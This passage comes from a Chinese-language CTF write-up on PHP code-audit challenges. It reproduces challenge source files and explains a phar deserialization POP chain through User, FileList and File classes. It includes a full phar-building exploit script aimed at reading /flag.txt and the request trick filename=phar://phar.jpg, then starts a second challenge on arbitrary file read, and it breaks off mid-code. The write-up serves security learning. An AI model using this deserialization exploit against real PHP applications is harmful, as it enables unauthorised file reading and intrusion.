class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only gif/jpg/png allowed&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$dst</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] . <span class="variable">$filename</span> . <span class="variable">$fileext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dst</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invaild filename&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filename=/var/www/html/download.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filename=/var/www/html/delete.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码很多，连接数据库的是 <code>class.php</code>，关键的点在<code>User</code>类中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 global 是引进全局变量，而这个 <code>$db</code> 是 class.php 里的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure><p>所以在 User 类的 close() 调用的是<code>mysqli::close</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在<code>File</code>类中也有个<code>close()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在<code>FileList</code>类中有魔术方法<code>__call()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/func_array_push.asp">array_push</a> 是把后面的参数添加到第一个参数里面，如果调用 close() 的话，就是先将方法名存储<code>$this-&gt;funcs</code>数组里</p><p>然后依次调用<code>$this-&gt;files</code>数组里的元素的 close() 方法，然后存储在<code>$this-&gt;results[$file-&gt;name()][$func]</code></p><p>如果是 File 类的 close()，就是获取文件的内容，所以<code>$this-&gt;files</code>数组里的元素必须为 File 类的对象</p><p>然后看<code>FileList</code>类的析构函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里先输出<code>$this-&gt;funcs</code>里的元素的值，然后输出<code>$this-&gt;results</code>数组里的数组元素的键值对，而在<code>__call()</code>函数里我们存储的文件的内容就在<code>$result as $func =&gt; $value</code>的<code>$value</code>里，所以只要构造<code>$this-&gt;files</code>的值，就可以在最后面输出其文件的内容，这样就可以获得 flag</p><p>构造 pop 链</p><p>User 类的析构函数为起点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;db</code>为<code>FileList</code>类的对象，然后触发其中的<code>__call()</code>方法，然后<code>$this-&gt;db</code>的<code>$this-&gt;files</code>数组成员的元素设置为<code>File</code>类的对象，调用<code>File</code>类的 close() 方法，并存储在<code>$this-&gt;db</code>的<code>$this-&gt;results</code>数组中，最后在<code>FileList</code>类的析构函数输出其值</p><p>然后构造 phar 文件，命名为 phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;/flag.txt&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$o</span>-&gt;db =<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="comment">// 下面是 phar 反序列化的通用模式</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为 phar，前缀由你上传的文件名字决定，例如你上传的是 1.jpg 那么这里就是 1.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置 stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先确认你的 php.ini 里面这里 <code>phar.readonly = off</code></p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4-4.png" alt="4-4"></p><p>然后在本地访问你的 phar.php，这样它会在同目录下生成一个 <code>phar.phar</code> 文件，修改名字为 <code>phar.jpg</code></p><p>然后把 phar.jpg 上传上去，对删除进行抓包，修改 <code>filename=phar://phar.jpg</code>，得到 flag</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4-3.png" alt="4-3"></p><h1 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h1><p>进去没东西，右键查看源码得到 flag 的地址</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5-1.png" alt="5-1"></p><p>上传文件后也只显示上传成功的弹窗，在查看文件那里还是空白，但是在 url 栏那里有一个任意文件读取的功能</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5-2.png" alt="5-2"></p><p>先看 index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>得到 base.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure><p>看看本体 file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>得到 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 